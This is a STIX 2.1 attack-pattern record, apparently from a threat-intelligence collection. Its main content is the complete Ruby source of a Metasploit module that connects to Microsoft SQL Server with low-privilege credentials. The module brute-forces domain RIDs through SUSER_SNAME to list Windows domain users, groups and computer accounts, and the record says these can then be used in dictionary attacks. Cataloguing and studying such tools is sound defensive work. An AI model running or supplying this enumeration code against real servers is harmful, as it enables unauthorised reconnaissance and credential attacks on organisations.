{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cdfd4152-7df7-4969-ab8f-16925dff75cb",
    "created": "2024-08-14T16:22:29.900504Z",
    "modified": "2024-08-14T16:22:29.900508Z",
    "name": "Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration",
    "description": " This module can be used to bruteforce RIDs associated with the domain of the SQL Server using the SUSER_SNAME function. This is similar to the smb_lookupsid module, but executed through SQL Server queries as any user with the PUBLIC role (everyone). Information that can be enumerated includes Windows domain users, groups, and computer accounts. Enumerated accounts can then be used in online dictionary attacks. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/mssql/mssql_enum_domain_accounts.rb",
            "external_id": "mssql_enum_domain_accounts.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::MSSQL\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration',\n      'Description' => %q{\n        This module can be used to bruteforce RIDs associated with the domain of the SQL Server\n        using the SUSER_SNAME function. This is similar to the smb_lookupsid module, but executed\n        through SQL Server queries as any user with the PUBLIC role (everyone). Information that\n        can be enumerated includes Windows domain users, groups, and computer accounts. Enumerated\n        accounts can then be used in online dictionary attacks.\n      },\n      'Author'      =>\n        [\n          'nullbind <scott.sutherland[at]netspi.com>',\n          'antti <antti.rantasaari[at]netspi.com>'\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  => [[ 'URL','https://docs.microsoft.com/en-us/sql/t-sql/functions/suser-sname-transact-sql']]\n    ))\n\n    register_options(\n      [\n        OptInt.new('FuzzNum', [true, 'Number of principal_ids to fuzz.', 10000]),\n      ])\n  end\n\n  def run\n    # Check connection and issue initial query\n    print_status(\"Attempting to connect to the database server at #{rhost}:#{rport} as #{datastore['USERNAME']}...\")\n    if mssql_login_datastore\n      print_good('Connected.')\n    else\n      print_error('Login was unsuccessful. Check your credentials.')\n      disconnect\n      return\n    end\n\n    # Get the server name\n    sql_server_name = get_sql_server_name\n    print_status(\"SQL Server Name: #{sql_server_name}\")\n\n    # Get the domain name\n    sql_server_domain = get_windows_domain\n    if sql_server_domain.nil?\n      print_error(\"Could not recover the SQL Server's domain.\")\n      disconnect\n      return\n    else\n      print_status(\"Domain Name: #{sql_server_domain}\")\n    end\n\n    # Check if the domain and hostname are the same\n    if sql_server_name == sql_server_domain\n      print_error(\"The SQL Server does not appear to be part of a Windows domain.\")\n      disconnect\n      return\n    end\n\n    # Get the base sid for the domain\n    windows_domain_sid = get_windows_domain_sid(sql_server_domain)\n    if windows_domain_sid.nil?\n      print_error(\"Could not recover the SQL Server's domain sid.\")\n      disconnect\n      return\n    else\n      print_good(\"Found the domain sid: #{windows_domain_sid}\")\n    end\n\n    # Get a list of windows users, groups, and computer accounts using SUSER_NAME()\n    print_status(\"Brute forcing #{datastore['FuzzNum']} RIDs through the SQL Server, be patient...\")\n    win_domain_user_list = get_win_domain_users(windows_domain_sid)\n\n    disconnect\n\n    if win_domain_user_list.nil? || win_domain_user_list.empty?\n      print_error('Sorry, no Windows domain accounts were found, or DC could not be contacted.')\n      return\n    end\n\n    # Print number of objects found and write to a file\n    print_good(\"#{win_domain_user_list.length} user accounts, groups, and computer accounts were found.\")\n\n    win_domain_user_list.sort.each do |windows_login|\n      vprint_status(\" - #{windows_login}\")\n    end\n\n    # Create table for report\n    windows_domain_login_table = Rex::Text::Table.new(\n      'Header'  => 'Windows Domain Accounts',\n      'Ident'   => 1,\n      'Columns' => ['name']\n    )\n\n    # Add brute forced names to table\n    win_domain_user_list.each do |object_name|\n      windows_domain_login_table << [object_name]\n    end\n\n    # Create output file\n    this_service = report_service(\n      :host  => rhost,\n      :port => rport,\n      :name => 'mssql',\n      :proto => 'tcp'\n    )\n    file_name = \"#{datastore['RHOST']}-#{datastore['RPORT']}_windows_domain_accounts.csv\"\n    path = store_loot(\n      'mssql.domain.accounts',\n      'text/plain',\n      datastore['RHOST'],\n      windows_domain_login_table.to_csv,\n      file_name,\n      'Domain Users enumerated through SQL Server',\n      this_service)\n    print_status(\"Query results have been saved to: #{path}\")\n  end\n\n  # Get list of windows accounts,groups,and computer accounts\n  def get_win_domain_users(windows_domain_sid)\n\n    # Create array to store the windws accounts etc\n    windows_logins = []\n\n    # Fuzz the principal_id parameter passed to the SUSER_NAME function\n    (500..datastore['FuzzNum']).each do |principal_id|\n\n      # Convert number to hex and fix order\n      principal_id_hex = \"%02X\" % principal_id\n      principal_id_hex_pad = (principal_id_hex.size.even? ? principal_id_hex : (\"0\"+ principal_id_hex))\n      principal_id_clean  = principal_id_hex_pad.scan(/(..)/).reverse.flatten.join\n\n      # Add padding\n      principal_id_hex_padded2 = principal_id_clean.ljust(8, '0')\n\n      # Create full sid\n      win_sid = \"0x#{windows_domain_sid}#{principal_id_hex_padded2}\"\n\n      # Return if sid does not resolve correctly for a domain\n      if win_sid.length < 48\n        return nil\n      end\n\n      # Setup query\n      sql = \"SELECT SUSER_SNAME(#{win_sid}) as name\"\n\n      # Execute query\n      result = mssql_query(sql)\n\n      # Parse results\n      parse_results = result[:rows]\n      windows_login = parse_results[0][0]\n\n      # Print account,group,or computer account etc\n      if windows_login.length != 0\n        print_status(\" - #{windows_login}\")\n\n        vprint_status(\"Test sid: #{win_sid}\")\n      end\n\n      # Add to windows domain object list\n      windows_logins.push(windows_login) unless windows_logins.include?(windows_login)\n    end\n\n    # Return list of logins\n    windows_logins\n  end\n\n  # Get windows domain\n  def get_windows_domain\n\n    # Setup query to check the domain\n    sql = \"SELECT DEFAULT_DOMAIN() as mydomain\"\n\n    # Run query\n    result = mssql_query(sql)\n\n    # Parse query results\n    parse_results = result[:rows]\n    sql_server_domain = parse_results[0][0]\n\n    # Return domain\n    sql_server_domain\n  end\n\n  # Get the sql server's hostname\n  def get_sql_server_name\n\n    # Setup query to check the server name\n    sql = \"SELECT @@servername\"\n\n    # Run query\n    result = mssql_query(sql)\n\n    # Parse query results\n    parse_results = result[:rows]\n    sql_instance_name = parse_results[0][0]\n    sql_server_name = sql_instance_name.split('\\\\')[0]\n\n    # Return servername\n    sql_server_name\n  end\n\n  # Get windows domain\n  def get_windows_domain_sid(sql_server_domain)\n\n    # Set group\n    domain_group = \"#{sql_server_domain}\\\\Domain Admins\"\n\n    # Setup query to check the Domain SID\n    sql = \"select SUSER_SID('#{domain_group}') as dasid\"\n\n    # Run query\n    result = mssql_query(sql)\n\n    # Parse query results\n    parse_results = result[:rows]\n    object_sid = parse_results[0][0]\n    domain_sid = object_sid[0..47]\n\n    # Return if sid does not resolve for a domain\n    if domain_sid.length == 0\n      return nil\n    end\n\n    # Return domain sid\n    domain_sid\n  end\nend\n"
}